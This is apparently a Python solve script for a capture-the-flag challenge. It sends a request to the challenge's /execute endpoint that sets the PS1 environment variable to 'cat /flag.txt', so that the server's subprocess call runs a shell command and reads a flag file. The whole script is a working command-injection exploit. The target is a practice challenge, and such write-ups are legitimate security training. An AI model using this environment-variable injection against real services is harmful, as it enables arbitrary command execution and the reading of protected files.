import os
import subprocess

import requests

TEST = False

params = {
    'name': 'PS1',
    'value': 'cat /flag.txt',
    'file': 'hello',
}

# checks
print('not exist:', not os.path.exists(params['file']))
print('not file:', not os.path.isfile(params['file']))
print('is abs path:', os.path.isabs(params['file']))
print()

environ = {}
environ[params['name']] = params['value']

file = os.path.realpath(params['file'])
print('realpath:', file)
print()
if TEST:
    output = subprocess.check_output(file, shell=False, env=environ)
    print("##########")
    print(output.decode())
    print("##########")

res = requests.get(
    'http://chal.polyuctf.com:51337/execute', params=params)

print(res.text)
